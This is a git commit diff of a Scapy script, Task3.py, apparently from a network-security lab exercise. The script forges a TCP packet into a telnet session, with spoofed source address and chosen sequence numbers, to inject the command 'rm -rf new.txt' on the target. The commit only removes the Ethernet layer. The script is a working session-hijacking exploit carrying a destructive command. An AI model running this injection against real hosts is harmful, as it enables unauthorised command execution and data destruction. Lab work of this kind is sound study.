c39e1dad932c0f4aba178d05ebc33b30033f3b71
Ethan Harris <576552241qwj@gmail.com>
2021-12-06 10:47:12 +0800

    main

--- Task3.py
+++ Task3.py
@@ -4,6 +4,6 @@ eth = Ether(src="02:42:0a:09:00:06")
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
 tcp = TCP(sport=59956, dport=23, flags="AP", seq=516336028, ack=2142703339)
 data = "rm -rf new.txt\r"
-pkt = eth/ip/tcp/data
+pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
